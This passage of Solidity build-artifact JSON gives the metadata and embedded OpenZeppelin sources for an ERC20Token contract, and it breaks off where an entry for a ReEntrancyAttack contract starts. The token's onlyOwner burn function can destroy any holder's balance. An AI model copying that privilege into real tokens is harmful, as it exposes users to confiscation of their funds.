inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"errors\":{\"ERC20InsufficientAllowance(address,uint256,uint256)\":[{\"details\":\"Indicates a failure with the `spender`\\u2019s `allowance`. Used in transfers.\",\"params\":{\"allowance\":\"Amount of tokens a `spender` is allowed to operate with.\",\"needed\":\"Minimum amount required to perform a transfer.\",\"spender\":\"Address that may be allowed to operate on tokens without being their owner.\"}}],\"ERC20InsufficientBalance(address,uint256,uint256)\":[{\"details\":\"Indicates an error related to the current `balance` of a `sender`. Used in transfers.\",\"params\":{\"balance\":\"Current balance for the interacting account.\",\"needed\":\"Minimum amount required to perform a transfer.\",\"sender\":\"Address whose tokens are being transferred.\"}}],\"ERC20InvalidApprover(address)\":[{\"details\":\"Indicates a failure with the `approver` of a token to be approved. Used in approvals.\",\"params\":{\"approver\":\"Address initiating an approval operation.\"}}],\"ERC20InvalidReceiver(address)\":[{\"details\":\"Indicates a failure with the token `receiver`. Used in transfers.\",\"params\":{\"receiver\":\"Address to which tokens are being transferred.\"}}],\"ERC20InvalidSender(address)\":[{\"details\":\"Indicates a failure with the token `sender`. Used in transfers.\",\"params\":{\"sender\":\"Address whose tokens are being transferred.\"}}],\"ERC20InvalidSpender(address)\":[{\"details\":\"Indicates a failure with the `spender` to be approved. Used in approvals.\",\"params\":{\"spender\":\"Address that may be allowed to operate on tokens without being their owner.\"}}],\"OwnableInvalidOwner(address)\":[{\"details\":\"The owner is not a valid owner account. (eg. `address(0)`)\"}],\"OwnableUnauthorizedAccount(address)\":[{\"details\":\"The caller account is not authorized to perform an operation.\"}]},\"events\":{\"Approval(address,address,uint256)\":{\"details\":\"Emitted when the allowance of a `spender` for an `owner` is set by a call to {approve}. `value` is the new allowance.\"},\"Transfer(address,address,uint256)\":{\"details\":\"Emitted when `value` tokens are moved from one account (`from`) to another (`to`). Note that `value` may be zero.\"}},\"kind\":\"dev\",\"methods\":{\"allowance(address,address)\":{\"details\":\"See {IERC20-allowance}.\"},\"approve(address,uint256)\":{\"details\":\"See {IERC20-approve}. NOTE: If `value` is the maximum `uint256`, the allowance is not updated on `transferFrom`. This is semantically equivalent to an infinite approval. Requirements: - `spender` cannot be the zero address.\"},\"balanceOf(address)\":{\"details\":\"See {IERC20-balanceOf}.\"},\"decimals()\":{\"details\":\"Returns the number of decimals used to get its user representation. For example, if `decimals` equals `2`, a balance of `505` tokens should be displayed to a user as `5.05` (`505 / 10 ** 2`). Tokens usually opt for a value of 18, imitating the relationship between Ether and Wei. This is the default value returned by this function, unless it's overridden. NOTE: This information is only used for _display_ purposes: it in no way affects any of the arithmetic of the contract, including {IERC20-balanceOf} and {IERC20-transfer}.\"},\"name()\":{\"details\":\"Returns the name of the token.\"},\"owner()\":{\"details\":\"Returns the address of the current owner.\"},\"renounceOwnership()\":{\"details\":\"Leaves the contract without owner. It will not be possible to call `onlyOwner` functions. Can only be called by the current owner. NOTE: Renouncing ownership will leave the contract without an owner, thereby disabling any functionality that is only available to the owner.\"},\"symbol()\":{\"details\":\"Returns the symbol of the token, usually a shorter version of the name.\"},\"totalSupply()\":{\"details\":\"See {IERC20-totalSupply}.\"},\"transfer(address,uint256)\":{\"details\":\"See {IERC20-transfer}. Requirements: - `to` cannot be the zero address. - the caller must have a balance of at least `value`.\"},\"transferFrom(address,address,uint256)\":{\"details\":\"See {IERC20-transferFrom}. Emits an {Approval} event indicating the updated allowance. This is not required by the EIP. See the note at the beginning of {ERC20}. NOTE: Does not update the allowance if the current allowance is the maximum `uint256`. Requirements: - `from` and `to` cannot be the zero address. - `from` must have a balance of at least `value`. - the caller must have allowance for ``from``'s tokens of at least `value`.\"},\"transferOwnership(address)\":{\"details\":\"Transfers ownership of the contract to a new account (`newOwner`). Can only be called by the current owner.\"}},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/ERC20Token.sol\":\"ERC20Token\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/access/Ownable.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.0) (access/Ownable.sol)\\n\\npragma solidity ^0.8.20;\\n\\nimport {Context} from \\\"../utils/Context.sol\\\";\\n\\n/**\\n * @dev Contract module which provides a basic access control mechanism, where\\n * there is an account (an owner) that can be granted exclusive access to\\n * specific functions.\\n *\\n * The initial owner is set to the address provided by the deployer. This can\\n * later be changed with {transferOwnership}.\\n *\\n * This module is used through inheritance. It will make available the modifier\\n * `onlyOwner`, which can be applied to your functions to restrict their use to\\n * the owner.\\n */\\nabstract contract Ownable is Context {\\n    address private _owner;\\n\\n    /**\\n     * @dev The caller account is not authorized to perform an operation.\\n     */\\n    error OwnableUnauthorizedAccount(address account);\\n\\n    /**\\n     * @dev The owner is not a valid owner account. (eg. `address(0)`)\\n     */\\n    error OwnableInvalidOwner(address owner);\\n\\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\\n\\n    /**\\n     * @dev Initializes the contract setting the address provided by the deployer as the initial owner.\\n     */\\n    constructor(address initialOwner) {\\n        if (initialOwner == address(0)) {\\n            revert OwnableInvalidOwner(address(0));\\n        }\\n        _transferOwnership(initialOwner);\\n    }\\n\\n    /**\\n     * @dev Throws if called by any account other than the owner.\\n     */\\n    modifier onlyOwner() {\\n        _checkOwner();\\n        _;\\n    }\\n\\n    /**\\n     * @dev Returns the address of the current owner.\\n     */\\n    function owner() public view virtual returns (address) {\\n        return _owner;\\n    }\\n\\n    /**\\n     * @dev Throws if the sender is not the owner.\\n     */\\n    function _checkOwner() internal view virtual {\\n        if (owner() != _msgSender()) {\\n            revert OwnableUnauthorizedAccount(_msgSender());\\n        }\\n    }\\n\\n    /**\\n     * @dev Leaves the contract without owner. It will not be possible to call\\n     * `onlyOwner` functions. Can only be called by the current owner.\\n     *\\n     * NOTE: Renouncing ownership will leave the contract without an owner,\\n     * thereby disabling any functionality that is only available to the owner.\\n     */\\n    function renounceOwnership() public virtual onlyOwner {\\n        _transferOwnership(address(0));\\n    }\\n\\n    /**\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\n     * Can only be called by the current owner.\\n     */\\n    function transferOwnership(address newOwner) public virtual onlyOwner {\\n        if (newOwner == address(0)) {\\n            revert OwnableInvalidOwner(address(0));\\n        }\\n        _transferOwnership(newOwner);\\n    }\\n\\n    /**\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\n     * Internal function without access restriction.\\n     */\\n    function _transferOwnership(address newOwner) internal virtual {\\n        address oldOwner = _owner;\\n        _owner = newOwner;\\n        emit OwnershipTransferred(oldOwner, newOwner);\\n    }\\n}\\n\",\"keccak256\":\"0xff6d0bb2e285473e5311d9d3caacb525ae3538a80758c10649a4d61029b017bb\",\"license\":\"MIT\"},\"@openzeppelin/contracts/interfaces/draft-IERC6093.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.0) (interfaces/draft-IERC6093.sol)\\npragma solidity ^0.8.20;\\n\\n/**\\n * @dev Standard ERC20 Errors\\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC20 tokens.\\n */\\ninterface IERC20Errors {\\n    /**\\n     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.\\n     * @param sender Address whose tokens are being transferred.\\n     * @param balance Current balance for the interacting account.\\n     * @param needed Minimum amount required to perform a transfer.\\n     */\\n    error ERC20InsufficientBalance(address sender, uint256 balance, uint256 needed);\\n\\n    /**\\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\\n     * @param sender Address whose tokens are being transferred.\\n     */\\n    error ERC20InvalidSender(address sender);\\n\\n    /**\\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\\n     * @param receiver Address to which tokens are being transferred.\\n     */\\n    error ERC20InvalidReceiver(address receiver);\\n\\n    /**\\n     * @dev Indicates a failure with the `spender`\\u2019s `allowance`. Used in transfers.\\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\\n     * @param allowance Amount of tokens a `spender` is allowed to operate with.\\n     * @param needed Minimum amount required to perform a transfer.\\n     */\\n    error ERC20InsufficientAllowance(address spender, uint256 allowance, uint256 needed);\\n\\n    /**\\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\\n     * @param approver Address initiating an approval operation.\\n     */\\n    error ERC20InvalidApprover(address approver);\\n\\n    /**\\n     * @dev Indicates a failure with the `spender` to be approved. Used in approvals.\\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\\n     */\\n    error ERC20InvalidSpender(address spender);\\n}\\n\\n/**\\n * @dev Standard ERC721 Errors\\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC721 tokens.\\n */\\ninterface IERC721Errors {\\n    /**\\n     * @dev Indicates that an address can't be an owner. For example, `address(0)` is a forbidden owner in EIP-20.\\n     * Used in balance queries.\\n     * @param owner Address of the current owner of a token.\\n     */\\n    error ERC721InvalidOwner(address owner);\\n\\n    /**\\n     * @dev Indicates a `tokenId` whose `owner` is the zero address.\\n     * @param tokenId Identifier number of a token.\\n     */\\n    error ERC721NonexistentToken(uint256 tokenId);\\n\\n    /**\\n     * @dev Indicates an error related to the ownership over a particular token. Used in transfers.\\n     * @param sender Address whose tokens are being transferred.\\n     * @param tokenId Identifier number of a token.\\n     * @param owner Address of the current owner of a token.\\n     */\\n    error ERC721IncorrectOwner(address sender, uint256 tokenId, address owner);\\n\\n    /**\\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\\n     * @param sender Address whose tokens are being transferred.\\n     */\\n    error ERC721InvalidSender(address sender);\\n\\n    /**\\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\\n     * @param receiver Address to which tokens are being transferred.\\n     */\\n    error ERC721InvalidReceiver(address receiver);\\n\\n    /**\\n     * @dev Indicates a failure with the `operator`\\u2019s approval. Used in transfers.\\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\\n     * @param tokenId Identifier number of a token.\\n     */\\n    error ERC721InsufficientApproval(address operator, uint256 tokenId);\\n\\n    /**\\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\\n     * @param approver Address initiating an approval operation.\\n     */\\n    error ERC721InvalidApprover(address approver);\\n\\n    /**\\n     * @dev Indicates a failure with the `operator` to be approved. Used in approvals.\\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\\n     */\\n    error ERC721InvalidOperator(address operator);\\n}\\n\\n/**\\n * @dev Standard ERC1155 Errors\\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC1155 tokens.\\n */\\ninterface IERC1155Errors {\\n    /**\\n     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.\\n     * @param sender Address whose tokens are being transferred.\\n     * @param balance Current balance for the interacting account.\\n     * @param needed Minimum amount required to perform a transfer.\\n     * @param tokenId Identifier number of a token.\\n     */\\n    error ERC1155InsufficientBalance(address sender, uint256 balance, uint256 needed, uint256 tokenId);\\n\\n    /**\\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\\n     * @param sender Address whose tokens are being transferred.\\n     */\\n    error ERC1155InvalidSender(address sender);\\n\\n    /**\\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\\n     * @param receiver Address to which tokens are being transferred.\\n     */\\n    error ERC1155InvalidReceiver(address receiver);\\n\\n    /**\\n     * @dev Indicates a failure with the `operator`\\u2019s approval. Used in transfers.\\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\\n     * @param owner Address of the current owner of a token.\\n     */\\n    error ERC1155MissingApprovalForAll(address operator, address owner);\\n\\n    /**\\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\\n     * @param approver Address initiating an approval operation.\\n     */\\n    error ERC1155InvalidApprover(address approver);\\n\\n    /**\\n     * @dev Indicates a failure with the `operator` to be approved. Used in approvals.\\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\\n     */\\n    error ERC1155InvalidOperator(address operator);\\n\\n    /**\\n     * @dev Indicates an array length mismatch between ids and values in a safeBatchTransferFrom operation.\\n     * Used in batch transfers.\\n     * @param idsLength Length of the array of token identifiers\\n     * @param valuesLength Length of the array of token amounts\\n     */\\n    error ERC1155InvalidArrayLength(uint256 idsLength, uint256 valuesLength);\\n}\\n\",\"keccak256\":\"0x60c65f701957fdd6faea1acb0bb45825791d473693ed9ecb34726fdfaa849dd7\",\"license\":\"MIT\"},\"@openzeppelin/contracts/token/ERC20/ERC20.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.0) (token/ERC20/ERC20.sol)\\n\\npragma solidity ^0.8.20;\\n\\nimport {IERC20} from \\\"./IERC20.sol\\\";\\nimport {IERC20Metadata} from \\\"./extensions/IERC20Metadata.sol\\\";\\nimport {Context} from \\\"../../utils/Context.sol\\\";\\nimport {IERC20Errors} from \\\"../../interfaces/draft-IERC6093.sol\\\";\\n\\n/**\\n * @dev Implementation of the {IERC20} interface.\\n *\\n * This implementation is agnostic to the way tokens are created. This means\\n * that a supply mechanism has to be added in a derived contract using {_mint}.\\n *\\n * TIP: For a detailed writeup see our guide\\n * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How\\n * to implement supply mechanisms].\\n *\\n * The default value of {decimals} is 18. To change this, you should override\\n * this function so it returns a different value.\\n *\\n * We have followed general OpenZeppelin Contracts guidelines: functions revert\\n * instead returning `false` on failure. This behavior is nonetheless\\n * conventional and does not conflict with the expectations of ERC20\\n * applications.\\n *\\n * Additionally, an {Approval} event is emitted on calls to {transferFrom}.\\n * This allows applications to reconstruct the allowance for all accounts just\\n * by listening to said events. Other implementations of the EIP may not emit\\n * these events, as it isn't required by the specification.\\n */\\nabstract contract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors {\\n    mapping(address account => uint256) private _balances;\\n\\n    mapping(address account => mapping(address spender => uint256)) private _allowances;\\n\\n    uint256 private _totalSupply;\\n\\n    string private _name;\\n    string private _symbol;\\n\\n    /**\\n     * @dev Sets the values for {name} and {symbol}.\\n     *\\n     * All two of these values are immutable: they can only be set once during\\n     * construction.\\n     */\\n    constructor(string memory name_, string memory symbol_) {\\n        _name = name_;\\n        _symbol = symbol_;\\n    }\\n\\n    /**\\n     * @dev Returns the name of the token.\\n     */\\n    function name() public view virtual returns (string memory) {\\n        return _name;\\n    }\\n\\n    /**\\n     * @dev Returns the symbol of the token, usually a shorter version of the\\n     * name.\\n     */\\n    function symbol() public view virtual returns (string memory) {\\n        return _symbol;\\n    }\\n\\n    /**\\n     * @dev Returns the number of decimals used to get its user representation.\\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\\n     * be displayed to a user as `5.05` (`505 / 10 ** 2`).\\n     *\\n     * Tokens usually opt for a value of 18, imitating the relationship between\\n     * Ether and Wei. This is the default value returned by this function, unless\\n     * it's overridden.\\n     *\\n     * NOTE: This information is only used for _display_ purposes: it in\\n     * no way affects any of the arithmetic of the contract, including\\n     * {IERC20-balanceOf} and {IERC20-transfer}.\\n     */\\n    function decimals() public view virtual returns (uint8) {\\n        return 18;\\n    }\\n\\n    /**\\n     * @dev See {IERC20-totalSupply}.\\n     */\\n    function totalSupply() public view virtual returns (uint256) {\\n        return _totalSupply;\\n    }\\n\\n    /**\\n     * @dev See {IERC20-balanceOf}.\\n     */\\n    function balanceOf(address account) public view virtual returns (uint256) {\\n        return _balances[account];\\n    }\\n\\n    /**\\n     * @dev See {IERC20-transfer}.\\n     *\\n     * Requirements:\\n     *\\n     * - `to` cannot be the zero address.\\n     * - the caller must have a balance of at least `value`.\\n     */\\n    function transfer(address to, uint256 value) public virtual returns (bool) {\\n        address owner = _msgSender();\\n        _transfer(owner, to, value);\\n        return true;\\n    }\\n\\n    /**\\n     * @dev See {IERC20-allowance}.\\n     */\\n    function allowance(address owner, address spender) public view virtual returns (uint256) {\\n        return _allowances[owner][spender];\\n    }\\n\\n    /**\\n     * @dev See {IERC20-approve}.\\n     *\\n     * NOTE: If `value` is the maximum `uint256`, the allowance is not updated on\\n     * `transferFrom`. This is semantically equivalent to an infinite approval.\\n     *\\n     * Requirements:\\n     *\\n     * - `spender` cannot be the zero address.\\n     */\\n    function approve(address spender, uint256 value) public virtual returns (bool) {\\n        address owner = _msgSender();\\n        _approve(owner, spender, value);\\n        return true;\\n    }\\n\\n    /**\\n     * @dev See {IERC20-transferFrom}.\\n     *\\n     * Emits an {Approval} event indicating the updated allowance. This is not\\n     * required by the EIP. See the note at the beginning of {ERC20}.\\n     *\\n     * NOTE: Does not update the allowance if the current allowance\\n     * is the maximum `uint256`.\\n     *\\n     * Requirements:\\n     *\\n     * - `from` and `to` cannot be the zero address.\\n     * - `from` must have a balance of at least `value`.\\n     * - the caller must have allowance for ``from``'s tokens of at least\\n     * `value`.\\n     */\\n    function transferFrom(address from, address to, uint256 value) public virtual returns (bool) {\\n        address spender = _msgSender();\\n        _spendAllowance(from, spender, value);\\n        _transfer(from, to, value);\\n        return true;\\n    }\\n\\n    /**\\n     * @dev Moves a `value` amount of tokens from `from` to `to`.\\n     *\\n     * This internal function is equivalent to {transfer}, and can be used to\\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\\n     *\\n     * Emits a {Transfer} event.\\n     *\\n     * NOTE: This function is not virtual, {_update} should be overridden instead.\\n     */\\n    function _transfer(address from, address to, uint256 value) internal {\\n        if (from == address(0)) {\\n            revert ERC20InvalidSender(address(0));\\n        }\\n        if (to == address(0)) {\\n            revert ERC20InvalidReceiver(address(0));\\n        }\\n        _update(from, to, value);\\n    }\\n\\n    /**\\n     * @dev Transfers a `value` amount of tokens from `from` to `to`, or alternatively mints (or burns) if `from`\\n     * (or `to`) is the zero address. All customizations to transfers, mints, and burns should be done by overriding\\n     * this function.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function _update(address from, address to, uint256 value) internal virtual {\\n        if (from == address(0)) {\\n            // Overflow check required: The rest of the code assumes that totalSupply never overflows\\n            _totalSupply += value;\\n        } else {\\n            uint256 fromBalance = _balances[from];\\n            if (fromBalance < value) {\\n                revert ERC20InsufficientBalance(from, fromBalance, value);\\n            }\\n            unchecked {\\n                // Overflow not possible: value <= fromBalance <= totalSupply.\\n                _balances[from] = fromBalance - value;\\n            }\\n        }\\n\\n        if (to == address(0)) {\\n            unchecked {\\n                // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.\\n                _totalSupply -= value;\\n            }\\n        } else {\\n            unchecked {\\n                // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.\\n                _balances[to] += value;\\n            }\\n        }\\n\\n        emit Transfer(from, to, value);\\n    }\\n\\n    /**\\n     * @dev Creates a `value` amount of tokens and assigns them to `account`, by transferring it from address(0).\\n     * Relies on the `_update` mechanism\\n     *\\n     * Emits a {Transfer} event with `from` set to the zero address.\\n     *\\n     * NOTE: This function is not virtual, {_update} should be overridden instead.\\n     */\\n    function _mint(address account, uint256 value) internal {\\n        if (account == address(0)) {\\n            revert ERC20InvalidReceiver(address(0));\\n        }\\n        _update(address(0), account, value);\\n    }\\n\\n    /**\\n     * @dev Destroys a `value` amount of tokens from `account`, lowering the total supply.\\n     * Relies on the `_update` mechanism.\\n     *\\n     * Emits a {Transfer} event with `to` set to the zero address.\\n     *\\n     * NOTE: This function is not virtual, {_update} should be overridden instead\\n     */\\n    function _burn(address account, uint256 value) internal {\\n        if (account == address(0)) {\\n            revert ERC20InvalidSender(address(0));\\n        }\\n        _update(account, address(0), value);\\n    }\\n\\n    /**\\n     * @dev Sets `value` as the allowance of `spender` over the `owner` s tokens.\\n     *\\n     * This internal function is equivalent to `approve`, and can be used to\\n     * e.g. set automatic allowances for certain subsystems, etc.\\n     *\\n     * Emits an {Approval} event.\\n     *\\n     * Requirements:\\n     *\\n     * - `owner` cannot be the zero address.\\n     * - `spender` cannot be the zero address.\\n     *\\n     * Overrides to this logic should be done to the variant with an additional `bool emitEvent` argument.\\n     */\\n    function _approve(address owner, address spender, uint256 value) internal {\\n        _approve(owner, spender, value, true);\\n    }\\n\\n    /**\\n     * @dev Variant of {_approve} with an optional flag to enable or disable the {Approval} event.\\n     *\\n     * By default (when calling {_approve}) the flag is set to true. On the other hand, approval changes made by\\n     * `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any\\n     * `Approval` event during `transferFrom` operations.\\n     *\\n     * Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to\\n     * true using the following override:\\n     * ```\\n     * function _approve(address owner, address spender, uint256 value, bool) internal virtual override {\\n     *     super._approve(owner, spender, value, true);\\n     * }\\n     * ```\\n     *\\n     * Requirements are the same as {_approve}.\\n     */\\n    function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual {\\n        if (owner == address(0)) {\\n            revert ERC20InvalidApprover(address(0));\\n        }\\n        if (spender == address(0)) {\\n            revert ERC20InvalidSpender(address(0));\\n        }\\n        _allowances[owner][spender] = value;\\n        if (emitEvent) {\\n            emit Approval(owner, spender, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Updates `owner` s allowance for `spender` based on spent `value`.\\n     *\\n     * Does not update the allowance value in case of infinite allowance.\\n     * Revert if not enough allowance is available.\\n     *\\n     * Does not emit an {Approval} event.\\n     */\\n    function _spendAllowance(address owner, address spender, uint256 value) internal virtual {\\n        uint256 currentAllowance = allowance(owner, spender);\\n        if (currentAllowance != type(uint256).max) {\\n            if (currentAllowance < value) {\\n                revert ERC20InsufficientAllowance(spender, currentAllowance, value);\\n            }\\n            unchecked {\\n                _approve(owner, spender, currentAllowance - value, false);\\n            }\\n        }\\n    }\\n}\\n\",\"keccak256\":\"0xc3e1fa9d1987f8d349dfb4d6fe93bf2ca014b52ba335cfac30bfe71e357e6f80\",\"license\":\"MIT\"},\"@openzeppelin/contracts/token/ERC20/IERC20.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.0) (token/ERC20/IERC20.sol)\\n\\npragma solidity ^0.8.20;\\n\\n/**\\n * @dev Interface of the ERC20 standard as defined in the EIP.\\n */\\ninterface IERC20 {\\n    /**\\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\\n     * another (`to`).\\n     *\\n     * Note that `value` may be zero.\\n     */\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\n\\n    /**\\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\\n     * a call to {approve}. `value` is the new allowance.\\n     */\\n    event Approval(address indexed owner, address indexed spender, uint256 value);\\n\\n    /**\\n     * @dev Returns the value of tokens in existence.\\n     */\\n    function totalSupply() external view returns (uint256);\\n\\n    /**\\n     * @dev Returns the value of tokens owned by `account`.\\n     */\\n    function balanceOf(address account) external view returns (uint256);\\n\\n    /**\\n     * @dev Moves a `value` amount of tokens from the caller's account to `to`.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function transfer(address to, uint256 value) external returns (bool);\\n\\n    /**\\n     * @dev Returns the remaining number of tokens that `spender` will be\\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\\n     * zero by default.\\n     *\\n     * This value changes when {approve} or {transferFrom} are called.\\n     */\\n    function allowance(address owner, address spender) external view returns (uint256);\\n\\n    /**\\n     * @dev Sets a `value` amount of tokens as the allowance of `spender` over the\\n     * caller's tokens.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\\n     * that someone may use both the old and the new allowance by unfortunate\\n     * transaction ordering. One possible solution to mitigate this race\\n     * condition is to first reduce the spender's allowance to 0 and set the\\n     * desired value afterwards:\\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n     *\\n     * Emits an {Approval} event.\\n     */\\n    function approve(address spender, uint256 value) external returns (bool);\\n\\n    /**\\n     * @dev Moves a `value` amount of tokens from `from` to `to` using the\\n     * allowance mechanism. `value` is then deducted from the caller's\\n     * allowance.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function transferFrom(address from, address to, uint256 value) external returns (bool);\\n}\\n\",\"keccak256\":\"0xc6a8ff0ea489379b61faa647490411b80102578440ab9d84e9a957cc12164e70\",\"license\":\"MIT\"},\"@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.0) (token/ERC20/extensions/IERC20Metadata.sol)\\n\\npragma solidity ^0.8.20;\\n\\nimport {IERC20} from \\\"../IERC20.sol\\\";\\n\\n/**\\n * @dev Interface for the optional metadata functions from the ERC20 standard.\\n */\\ninterface IERC20Metadata is IERC20 {\\n    /**\\n     * @dev Returns the name of the token.\\n     */\\n    function name() external view returns (string memory);\\n\\n    /**\\n     * @dev Returns the symbol of the token.\\n     */\\n    function symbol() external view returns (string memory);\\n\\n    /**\\n     * @dev Returns the decimals places of the token.\\n     */\\n    function decimals() external view returns (uint8);\\n}\\n\",\"keccak256\":\"0xaa761817f6cd7892fcf158b3c776b34551cde36f48ff9703d53898bc45a94ea2\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/Context.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.0) (utils/Context.sol)\\n\\npragma solidity ^0.8.20;\\n\\n/**\\n * @dev Provides information about the current execution context, including the\\n * sender of the transaction and its data. While these are generally available\\n * via msg.sender and msg.data, they should not be accessed in such a direct\\n * manner, since when dealing with meta-transactions the account sending and\\n * paying for execution may not be the actual sender (as far as an application\\n * is concerned).\\n *\\n * This contract is only required for intermediate, library-like contracts.\\n */\\nabstract contract Context {\\n    function _msgSender() internal view virtual returns (address) {\\n        return msg.sender;\\n    }\\n\\n    function _msgData() internal view virtual returns (bytes calldata) {\\n        return msg.data;\\n    }\\n}\\n\",\"keccak256\":\"0x75a4ee64c68dbd5f38bddd06e664a64c8271b4caa554fb6f0607dfd672bb4bf3\",\"license\":\"MIT\"},\"contracts/ERC20Token.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.21;\\n\\nimport \\\"@openzeppelin/contracts/token/ERC20/ERC20.sol\\\";\\nimport \\\"@openzeppelin/contracts/utils/Context.sol\\\";\\nimport \\\"@openzeppelin/contracts/access/Ownable.sol\\\";\\n\\ncontract ERC20Token is Context, ERC20, Ownable {\\n    constructor(\\n        uint256 initialSupply,\\n        address contractAddress\\n    ) Ownable(msg.sender) ERC20(\\\"ERC20Token\\\", \\\"ET\\\") {\\n        _mint(msg.sender, initialSupply * (10 ** 18));\\n        approve(contractAddress, initialSupply * (10 ** 18));\\n    }\\n\\n    function burn(address i_owner, uint256 amount) public onlyOwner {\\n        _burn(i_owner, amount * 10 ** 18);\\n    }\\n}\\n\",\"keccak256\":\"0xcfe9dcc28ba35f1fc2628f8132fa82b4228fdcb2a9bc3ff1a5af887bc40a79c2\",\"license\":\"MIT\"}},\"version\":1}","storageLayout":{"storage":[{"astId":307,"contract":"contracts/ERC20Token.sol:ERC20Token","label":"_balances","offset":0,"slot":"0","type":"t_mapping(t_address,t_uint256)"},{"astId":313,"contract":"contracts/ERC20Token.sol:ERC20Token","label":"_allowances","offset":0,"slot":"1","type":"t_mapping(t_address,t_mapping(t_address,t_uint256))"},{"astId":315,"contract":"contracts/ERC20Token.sol:ERC20Token","label":"_totalSupply","offset":0,"slot":"2","type":"t_uint256"},{"astId":317,"contract":"contracts/ERC20Token.sol:ERC20Token","label":"_name","offset":0,"slot":"3","type":"t_string_storage"},{"astId":319,"contract":"contracts/ERC20Token.sol:ERC20Token","label":"_symbol","offset":0,"slot":"4","type":"t_string_storage"},{"astId":8,"contract":"contracts/ERC20Token.sol:ERC20Token","label":"_owner","offset":0,"slot":"5","type":"t_address"}],"types":{"t_address":{"encoding":"inplace","label":"address","numberOfBytes":"20"},"t_mapping(t_address,t_mapping(t_address,t_uint256))":{"encoding":"mapping","key":"t_address","label":"mapping(address => mapping(address => uint256))","numberOfBytes":"32","value":"t_mapping(t_address,t_uint256)"},"t_mapping(t_address,t_uint256)":{"encoding":"mapping","key":"t_address","label":"mapping(address => uint256)","numberOfBytes":"32","value":"t_uint256"},"t_string_storage":{"encoding":"bytes","label":"string","numberOfBytes":"32"},"t_uint256":{"encoding":"inplace","label":"uint256","numberOfBytes":"32"}}},"userdoc":{"kind":"user","methods":{},"version":1}}},"contracts/ReEntrancyAttack.sol":{"ReEntrancyAttack":{"abi":[{"inputs":[{"internalType":"address 